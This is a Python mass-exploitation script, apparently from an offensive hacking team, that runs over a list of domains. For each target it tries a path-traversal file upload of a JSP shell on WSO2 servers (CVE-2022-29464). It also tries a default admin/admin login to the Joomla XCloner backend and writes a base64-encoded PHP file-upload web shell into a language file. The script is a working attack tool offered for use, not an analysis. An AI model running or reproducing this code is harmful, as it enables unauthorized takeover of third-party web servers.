#!/usr/bin/python3

import os
from sys import stdout
import requests
import concurrent.futures
import base64
import urllib3
urllib3.disable_warnings()

if os.system('Windows'):
    os.system('cls')
    os.system('color 2')
elif os.system('Linux'):
    os.system('clear')

def banner():
    print()
    stdout.write('╔═════════════════════════════════╗\n')
    stdout.write('║       01110010 01101110         ║\n')
    stdout.write('║       01000111 01101111         ║\n')
    stdout.write('║       01110110 01100101         ║\n')
    stdout.write('╠═════════════════════════════════╣\n')
    stdout.write('║                                 ║\n')
    stdout.write('║ Author : 0verflowSec[OCT]       ║\n')
    stdout.write('║ Team : OasisCyberTeam           ║\n')
    stdout.write('║                                 ║\n')
    stdout.write('╚═════════════════════════════════╝\n')
    print()
banner()

def exploit1(url):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36', 'Content-Type': 'application/json'} # .MF, .jspx, .jspf, .jsw, .jsv, xml, .war, .jsp, .aspx
        files = {"../../../../repository/deployment/server/webapps/authenticationendpoint/meow.jsp": open("Files/meow.jsp", "rb")}

        resp = requests.post(f"{url}/fileupload/toolsAny", timeout=10, verify=False, files=files)

        if resp.status_code == 200 and len(resp.content) > 0 and 'java' not in resp.text:
            print(f"[CVE-2022-29464] .: {url}/authenticationendpoint/meow.jsp")
        else:
            print(f"Not vuln : {url}")
    except KeyboardInterrupt:
        print(f"KeyboardInterrupt")

def exploit2(url):
    se = requests.session()
    Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
    sh = base64.b64decode('PD9waHANCmVjaG8gIlRvb2xzIEJ5IDB2ZXJmbG93U2VjIjsNCiRmaWxlcyA9IEAkX0ZJTEVTWyJmaWxlcyJdOw0KaWYgKCRmaWxlc1sibmFtZSJdICE9ICcnKSB7DQogICAgJGZ1bGxwYXRoID0gJF9SRVFVRVNUWyJwYXRoIl0gLiAkZmlsZXNbIm5hbWUiXTsNCiAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRmaWxlc1sndG1wX25hbWUnXSwgJGZ1bGxwYXRoKSkgew0KICAgICAgICBlY2hvICI8aDE+PGEgaHJlZj0nJGZ1bGxwYXRoJz5PSy1DbGljayBoZXJlITwvYT48L2gxPiI7DQogICAgfQ0KfWVjaG8gJzxodG1sPjxoZWFkPjx0aXRsZT5VcGxvYWQgZmlsZXMuLi48L3RpdGxlPjwvaGVhZD48Ym9keT48Zm9ybSBtZXRob2Q9UE9TVCBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBhY3Rpb249IiI+PGlucHV0IHR5cGU9dGV4dCBuYW1lPXBhdGg+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGVzIj48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9IlVwIj48L2Zvcm0+PC9ib2R5PjwvaHRtbD4nOw0KPz4=')

    try:
        exp = url + '/administrator/components/com_xcloner-backupandrestore/index2.php'
        c1 = se.get(exp, headers=Agent, timeout=20, verify=False, allow_redirects=False)

        if 'Authentication Area:' in c1.content:
            data = {'username': 'admin','password': 'admin','option': 'com_cloner','task': 'dologin','boxchecked': 0,'hidemainmenu': 0}
            c2 = se.post(exp, headers=Agent, data=data, verify=False, timeout=20)

            if 'mosmsg=Welcome+to+XCloner+backend' in c2.text:
                data2 = {'def_content':sh,'option':'com_cloner','language':'english','task':'save_lang','boxchecked':0,'hidemainmenu':0}
                c3 = se.post(exp, headers=Agent, data=data2, verify=False, timeout=20)
                if 'successfully' in c3.content:

                    Overshell = url + '/administrator/components/com_xcloner-backupandrestore/language/english.php'
                    c4 = se.get(Overshell, headers=Agent, verify=False, timeout=20)

                    if base64.b64decode('VG9vbHMgQnkgMHZlcmZsb3dTZWM=') in c4.content:
                        print(f'[ 0Day ] : {Overshell}')
                    else:
                        print(f"Not vuln : {url}")

            else:
                print(f"Not vuln : {url}")

        else:
            print(f"Not vuln : {url}")

    except KeyboardInterrupt:
        print(f"KeyboardInterrupt")

    except:
        pass

##############################################################################################################################

def mass_scan():
    urls_file = input(f"Domain or IPs List [Without HTTP/S]: ")
    if not os.path.isfile(urls_file):
        print(f"ERROR: File not found.\n")
        return

    with open(urls_file, "r") as f:
        urls = f.read().splitlines()
    
    urls = [url if url.startswith("http") else "https://" + url for url in urls]

    try:
        max_threads = int(input(f"Threads (Default 10): ") or "10")

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            res = [executor.submit(exploit1, url) for url in urls]
            res2 = [executor.submit(exploit2, url) for url in urls]
    except KeyboardInterrupt:
        print(f"\nKeyboardInterrupt")
    
##############################################################################################################################



if __name__ == '__main__':
    mass_scan()